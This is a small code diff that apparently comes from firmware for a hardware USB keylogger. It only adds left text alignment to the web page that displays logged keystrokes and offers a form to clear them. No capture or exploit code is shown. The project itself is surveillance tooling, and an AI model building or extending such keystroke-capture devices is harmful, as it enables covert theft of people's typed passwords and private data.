@@ -45,7 +45,7 @@ void handleRoot() {
         </div>
         <div class="container">
             <h2>USB Keylogger Logs</h2>
-            <pre style="background-color:#333;border:1px solid #555;padding:15px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;max-height:400px;overflow-y:auto">)rawliteral";    
+            <pre style="text-align:left;background-color:#333;border:1px solid #555;padding:15px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;max-height:400px;overflow-y:auto">)rawliteral";    
     html += readLogFile();   
     html += R"rawliteral(</pre>
             <form action='/clear' method='POST'>
